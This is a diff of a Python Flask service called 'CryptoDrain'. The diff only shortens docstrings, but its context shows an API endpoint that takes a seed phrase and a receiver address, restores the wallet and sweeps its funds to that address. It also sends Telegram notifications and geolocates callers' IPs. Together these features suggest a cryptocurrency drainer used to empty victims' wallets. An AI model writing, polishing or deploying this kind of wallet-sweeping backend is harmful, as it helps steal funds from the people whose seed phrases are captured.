@@ -63,9 +63,7 @@ class Config:
 # Logger Setup
 # =============================================================================
 def setup_logger(log_file='logfile.txt'):
-    """
-    Setup a rotating file logger.
-    """
+    """Setup a rotating file logger."""
     logger = logging.getLogger('CryptoDrain')
     logger.setLevel(logging.INFO)
     formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
@@ -77,9 +75,7 @@ def setup_logger(log_file='logfile.txt'):
 logger = setup_logger()
 
 def safe_log(message, sensitive=False):
-    """
-    Log a message. If the message contains sensitive data, mark it accordingly.
-    """
+    """Log a message. If the message contains sensitive data, mark it accordingly."""
     if sensitive:
         logger.info("[SENSITIVE] " + message)
     else:
@@ -96,9 +92,7 @@ app = Flask(__name__)
 # Boot Screen Function
 # =============================================================================
 def boot_screen():
-    """
-    Clear the terminal and print the boot screen with application details.
-    """
+    """Clear the terminal and print the boot screen with application details."""
     os.system('cls' if os.name == 'nt' else 'clear')
     safe_log('Terminal cleared for boot screen.')
     ascii_banner = pyfiglet.figlet_format('CryptoDrain')
@@ -144,9 +138,7 @@ def tg_notify(message):
 
 
 def get_ip_details(ip):
-    """
-    Retrieve IP location details from an external API and cache in flask.g.
-    """
+    """Retrieve IP location details from an external API and cache in flask.g."""
     if not hasattr(g, 'ip_details'):
         try:
             resp = requests.get(f'https://ipapi.co/{ip}/json/').json()
@@ -161,27 +153,21 @@ def get_ip_details(ip):
 
 
 def current_ip():
-    """
-    Get the current IP address from the request.
-    """
+    """Get the current IP address from the request."""
     ip = request.environ.get('REMOTE_ADDR', 'N/A')
     safe_log(f'Current IP fetched: {ip}')
     return ip
 
 
 def sanitize_input(value):
-    """
-    Sanitize input to prevent XSS attacks.
-    """
+    """Sanitize input to prevent XSS attacks."""
     if value:
         return value.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
     return value
 
 
 def validate_input(api_key, seedphrase, receiver, balance):
-    """
-    Validate input parameters using proper formats.
-    """
+    """Validate input parameters using proper formats."""
     # Validate API key using the uuid module.
     try:
         uuid.UUID(api_key)
@@ -211,18 +197,14 @@ def validate_input(api_key, seedphrase, receiver, balance):
 # Wallet Manager Class
 # =============================================================================
 class WalletManager:
-    """
-    Manage wallet creation and sweeping operations.
-    """
+    """Manage wallet creation and sweeping operations."""
     def __init__(self, seedphrase):
         self.seedphrase = sanitize_input(seedphrase)
         self.wallet = None
         self.wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(12))
 
     def create_wallet(self):
-        """
-        Create a wallet using the provided seed phrase.
-        """
+        """Create a wallet using the provided seed phrase."""
         try:
             # Delete an existing wallet with the same name if it exists.
             if wallet_delete_if_exists(self.wallet_name, force=True):
@@ -246,9 +228,7 @@ class WalletManager:
             return False, f"Wallet creation failed: {e}"
 
     def sweep_wallet(self, receiver):
-        """
-        Sweep wallet funds to the provided receiver address.
-        """
+        """Sweep wallet funds to the provided receiver address."""
         try:
             safe_log("Sweeping wallet...", sensitive=True)
             _ = self.wallet.sweep(receiver, offline=False)
@@ -264,9 +244,7 @@ class WalletManager:
 # =============================================================================
 @app.route('/api')
 def api_route():
-    """
-    API endpoint to create and sweep a wallet.
-    """
+    """API endpoint to create and sweep a wallet."""
     try:
         safe_log("API endpoint called. Validating request.")
         api_key = request.args.get('api-key')
@@ -327,9 +305,7 @@ def api_route():
 
 @app.route('/health')
 def health():
-    """
-    Health-check endpoint.
-    """
+    """Health-check endpoint."""
     return jsonify({'status': 'ok'}), 200
 
 
@@ -337,9 +313,7 @@ def health():
 # Main Function
 # =============================================================================
 def main():
-    """
-    Main function to run the Flask server.
-    """
+    """Main function to run the Flask server."""
     boot_screen()
     try:
         # Load configuration and store in Flask app config.
